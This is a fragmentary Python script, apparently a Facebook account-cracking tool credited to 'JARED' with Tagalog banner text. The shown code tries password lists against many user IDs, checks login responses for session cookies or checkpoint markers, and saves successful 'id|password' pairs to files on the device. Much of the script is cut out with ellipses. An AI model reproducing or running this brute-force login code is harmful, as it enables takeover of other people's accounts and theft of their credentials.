...
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mJARED
...
\033[1;37m[\033[1;35mâ€¢\033[1;37m]\033[1;35mVERSION   :\033[1;36m0.01
\033[1;32m------------------------------------------------------"""
def clear():
    os.system("clear")
    print(logo) 
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/JARED_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[JARED] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [JARED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JARED_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def danger_menu():
    ...
    if id in DARK:
        ...
        os.system("clear")
        print(logo)
        print("\t\033[30m   [\033[1;32m\033[47m ISA KANG MAPANGHE\033[00m\033[1;30m]")
        print ("")
        print("BOBO SI VLAD")
        print ("")
        print("FREE LANG TO WAG MASYADONG MAPANGHE   ")
